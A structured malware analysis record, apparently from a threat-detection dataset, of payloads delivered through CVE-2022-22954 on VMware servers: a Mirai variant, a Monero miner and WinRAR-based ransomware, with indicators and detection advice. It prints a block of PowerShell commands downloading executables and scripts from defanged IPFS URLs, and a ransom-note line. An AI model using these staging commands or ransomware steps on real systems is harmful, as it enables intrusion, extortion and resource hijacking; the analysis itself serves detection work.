package_info.package_manager: N/A (malware delivered via remote code execution exploiting CVE-2022-22954)
package_info.package_versions: N/A (affects VMware Workspace ONE Access and Identity Manager vulnerable to CVE-2022-22954)
package_info.why_malicious: These malware packages are delivered via exploitation of a critical VMware RCE vulnerability (CVE-2022-22954). They perform unauthorized actions including deploying ransomware (RAR1Ransom), cryptominers (GuardMiner), and botnet clients (Mirai Variant), exfiltrating data, establishing persistence, and enabling lateral movement, all without user consent. The payloads are designed to maximize attacker control, persistence, and monetization of compromised systems through extortion, resource hijacking, and network propagation.

malicious_snippets.code_behavior: At runtime after exploitation, the code downloads a Mirai variant binary from a hardcoded IP address, modifies its permissions to make it executable, and executes it with a specific parameter, resulting in the compromised system joining a botnet and awaiting further command and control instructions.

malice_analysis.why_suspicious: The code performs an arbitrary download and execution of a binary from an external, non-trusted IP address, which is a classic sign of malware deployment and remote control.
malice_analysis.violated_expectations: Normal server operation should not involve downloading and running unknown binaries from the internet, especially from hardcoded IP addresses without validation.
malice_analysis.similar_legitimate_use: Automated update scripts for trusted software, which always include integrity checks and use trusted sources.
key_indicators: Download from hardcoded external IP address
Execution of unknown binary immediately after download
No user interaction or consent required
No integrity or authenticity verification

execution_context.file_location: Windows: PowerShell script (init.ps1); Linux: shell script (init.sh)

malicious_snippets.code_snippet:
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../phpupdate.exe -OutFile phpupdate.exe
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../config.json -OutFile config.json
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../networkmanager.exe -OutFile networkmanager.exe
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../phpguard.exe -OutFile phpguard.exe
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../init.ps1 -OutFile init.ps1
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../clean.bat -OutFile clean.bat
Invoke-WebRequest -Uri https://cloudflare-ipfs[.]com/ipfs/.../encrypt.exe -OutFile encrypt.exe
# (Similar logic for Linux using curl/wget in init.sh)
malicious_snippets.code_behavior: At runtime after exploitation, the script downloads multiple payloads (including miner, ransomware, persistence tools, and configuration files) from public file hosting services using PowerShell or shell commands, writes them to disk, and prepares the system for further compromise and monetization.

malice_analysis.why_suspicious: Bulk download of multiple executables and scripts from untrusted, public file hosting services is highly indicative of a multi-stage malware deployment and staging of additional payloads.
malice_analysis.violated_expectations: Legitimate scripts should not fetch and execute arbitrary binaries from the internet without validation or user awareness, especially from public file hosting services.
malice_analysis.similar_legitimate_use: Automated deployment in DevOps pipelines, but only with trusted sources and cryptographic validation.
key_indicators: Multiple external downloads from public file hosting (cloudflare-ipfs, crustwebsites)
No integrity or authenticity checks on downloaded files
Presence of multiple new executables/scripts in a short time frame
Preparation for multi-stage attack

malicious_snippets.code_behavior: At runtime, the script creates a scheduled task that re-executes the malicious PowerShell script every 10 minutes, ensuring persistent execution of the malware on the compromised system.

malice_analysis.why_suspicious: Malware commonly uses scheduled tasks to maintain persistence after initial infection, allowing it to survive reboots and user logouts.
malice_analysis.violated_expectations: Legitimate scheduled tasks should be created by trusted software and be transparent to system administrators, not reference unknown or suspicious scripts.
malice_analysis.similar_legitimate_use: System maintenance scripts or legitimate software updaters, but with administrator awareness and documentation.
key_indicators: Scheduled task creation referencing a suspicious or unknown script
Bypassing PowerShell execution policy restrictions
Frequent re-execution interval (every 10 minutes)

malicious_snippets.code_behavior: At runtime, the script executes WinRAR from a temporary directory to archive and encrypt victim files with a strong password, deletes the original files after encryption, and appends a .rar1 extension, resulting in the effective encryption and removal of user data for ransom.

malice_analysis.why_suspicious: Use of a legitimate archiving tool (WinRAR) to encrypt and delete user files with a strong, random password is a common ransomware tactic to deny victims access to their data.
malice_analysis.violated_expectations: Normal use of WinRAR does not involve automated, mass encryption and deletion of user files without user initiation or backup.
malice_analysis.similar_legitimate_use: Manual file backup or archiving, but without deletion of originals or use of strong, unknown passwords.
key_indicators: WinRAR (rar.exe) invoked with -df (delete files) and -hp (encrypt headers) options
Use of a long, random password for encryption
Targeting user data directories for encryption
Creation of files with .rar1 extension

malicious_snippets.code_snippet: echo 'Your files have been encrypted. To recover them, contact ...' > READ_TO_DECRYPT.txt
malicious_snippets.code_behavior: After encrypting files, the malware writes a ransom note to a text file in each affected directory, instructing victims on how to pay for decryption and recover their data.

malice_analysis.why_suspicious: Dropping ransom notes in directories containing encrypted files is a hallmark of ransomware activity, providing instructions for extortion.
malice_analysis.violated_expectations: Legitimate software does not create ransom demands or instruct users to pay for data recovery.
malice_analysis.similar_legitimate_use: None; no legitimate software creates ransom notes.
key_indicators: Creation of ransom note file (READ_TO_DECRYPT.txt)
Ransom note appears alongside encrypted data
Content instructs user to contact attacker for decryption

malicious_snippets.code_behavior: At runtime, the script launches a Monero mining process using the downloaded phpupdate.exe binary and a configuration file, causing the system to connect to mining pools and hijack CPU resources for illicit cryptocurrency mining.

malice_analysis.why_suspicious: Unsolicited cryptomining is a common monetization method for malware, resulting in resource hijacking and potential system instability.
malice_analysis.violated_expectations: Legitimate mining should be user-initiated, transparent, and not hidden within unrelated processes.
malice_analysis.similar_legitimate_use: User-approved mining software, with explicit user consent and resource management.
key_indicators: Silent launch of mining process (phpupdate.exe)
Use of external configuration file (config.json)
Outbound connections to Monero mining pools
High CPU usage without user explanation

malicious_snippets.code_behavior: At runtime, the malware executes a network scanning tool that scans the local network for vulnerable systems and attempts to exploit them using a list of known RCE vulnerabilities, enabling worm-like propagation to other hosts.

malice_analysis.why_suspicious: Automated scanning and exploitation of other systems is a key indicator of malware propagation and lateral movement, often used to expand attacker control.
malice_analysis.violated_expectations: Legitimate network management tools do not exploit vulnerabilities or attempt unauthorized access to other systems.
malice_analysis.similar_legitimate_use: Penetration testing tools, but only with explicit consent and in controlled environments.
key_indicators: Automated network scanning for vulnerabilities
Use of public or bundled exploit lists (exploits.txt)
Execution of exploitation attempts without authorization
Rapid connection attempts to multiple hosts

attack_chain.action: Attacker exploits CVE-2022-22954 to achieve remote code execution on VMware server.
Malicious command downloads and executes initial payloads (Mirai variant, init.ps1/init.sh) to establish a foothold.
Persistence is established via scheduled tasks (Windows) or cron jobs (Linux) to ensure continued execution.
Ransomware component encrypts user files using WinRAR and drops ransom note to extort payment.
Cryptominer is deployed and begins mining Monero using system resources, sending results to mining pools.
Malware scans for and attempts to exploit other vulnerable systems for lateral movement and worm-like propagation.

behavioral_signatures: Post-exploitation download and execution of binaries from untrusted external IP addresses or public file hosting services
Creation of scheduled tasks or cron jobs referencing unknown or suspicious scripts
Mass file encryption and deletion using WinRAR (rar.exe) or similar tools in temporary directories
Silent deployment and execution of cryptomining processes (e.g., phpupdate.exe)
Automated network scanning and exploitation attempts using bundled exploit lists
file_indicators: Presence of init.ps1, init.sh, phpupdate.exe, networkmanager.exe, phpguard.exe, encrypt.exe, clean.bat in non-standard locations
WinRAR (rar.exe) located in C:/Windows/Temp/ or other unusual directories
Files with .rar1 extension in user data directories
READ_TO_DECRYPT.txt ransom note in directories with encrypted files
network_indicators: Connections to cloudflare-ipfs.com, crustwebsites.net for payload retrieval
Outbound connections to Monero mining pools (as specified in config.json)
detection_knowledge.how_to_detect: Monitor for suspicious process creation involving wget, curl, or Invoke-WebRequest downloading executables or scripts from untrusted domains or hardcoded IP addresses. Detect creation of scheduled tasks or cron jobs referencing unknown or recently dropped scripts. Alert on mass file encryption and deletion, especially involving WinRAR (rar.exe) or similar tools in temporary directories. Look for the presence of known malware file indicators (init.ps1, phpupdate.exe, .rar1 files, ransom notes) in non-standard locations. Monitor for outbound connections to known C2 infrastructure, public file hosting services, and Monero mining pools. Correlate these behaviors with exploitation attempts of CVE-2022-22954 for high-confidence detection.
